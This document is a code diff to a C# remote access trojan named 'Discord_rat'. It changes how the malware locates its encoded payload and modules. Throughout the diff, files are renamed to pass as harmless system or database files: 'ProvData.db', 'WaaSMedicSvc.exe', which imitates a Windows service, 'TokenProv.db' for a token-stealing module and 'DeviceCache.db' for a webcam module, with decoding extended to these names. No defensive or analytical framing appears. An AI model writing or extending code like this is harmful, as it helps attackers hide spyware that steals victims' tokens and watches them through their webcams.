@@ -161,7 +161,11 @@ namespace Discord_rat
                 return path;
             }
 
-            string protectedPath = Path.Combine(GetPayloadDirectory(), "core.bin");
+            string protectedPath = Path.Combine(GetPayloadDirectory(), "ProvData.db");
+            if (!File.Exists(protectedPath))
+            {
+                protectedPath = Path.Combine(GetPayloadDirectory(), "core.bin");
+            }
             if (File.Exists(protectedPath))
             {
                 return protectedPath;
@@ -190,6 +194,7 @@ namespace Discord_rat
             string baseDir = GetPayloadDirectory();
             string[] candidates =
             {
+                Path.Combine(baseDir, "WaaSMedicSvc.exe"),
                 Path.Combine(baseDir, "RuntimeHost.exe"),
                 Path.Combine(baseDir, "Loader.exe")
             };
@@ -216,7 +221,8 @@ namespace Discord_rat
         public static byte[] ReadModuleFile(string path)
         {
             byte[] raw = File.ReadAllBytes(path);
-            if (path.EndsWith(".bin", StringComparison.OrdinalIgnoreCase))
+            if (path.EndsWith(".bin", StringComparison.OrdinalIgnoreCase) ||
+                path.EndsWith(".db", StringComparison.OrdinalIgnoreCase))
             {
                 return DecodeProtectedBytes(raw);
             }
@@ -1525,9 +1531,11 @@ namespace Discord_rat
             switch (moduleKey)
             {
                 case "token":
+                    candidateNames.Add("TokenProv.db");
                     candidateNames.Add("token.bin");
                     break;
                 case "webcam":
+                    candidateNames.Add("DeviceCache.db");
                     candidateNames.Add("media.bin");
                     break;
             }
@@ -1537,6 +1545,7 @@ namespace Discord_rat
             var candidates = new List<string>();
             foreach (string name in candidateNames)
             {
+                candidates.Add(Path.Combine(baseDir, "Cache", name));
                 candidates.Add(Path.Combine(baseDir, "modules", name));
                 candidates.Add(Path.Combine(baseDir, name));
             }
